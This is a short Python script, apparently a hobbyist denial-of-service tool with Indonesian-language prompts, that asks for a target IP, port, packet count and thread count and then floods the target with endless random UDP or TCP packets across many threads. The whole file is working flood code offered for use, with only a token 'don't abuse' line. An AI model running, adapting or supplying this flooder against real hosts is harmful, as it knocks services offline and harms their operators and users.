#Wiltod
import random
import socket
import threading
import os

os.system("clear")
print('''William X Zen''')
print       (" - - > Tolls By William!!!! < - - ")
print       (" - - > Jangan Abuse!!!! < - - ")
ip = str(input("ip:"))
port = int(input("Port:"))
times = int(input("Paket:"))
threads = int(input("Pelor:"))
choice = str(input("Attack? (yes/no):"))
def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("!! Slebew!!!")
		except:
			print("!! Slebew !!!")

def run2():
	data = random._urandom(150)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("!! Slebew!!!")
		except:
			s.close()
			print("!! Slebew !!!")

for y in range(threads):
	if choice == 'yes':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()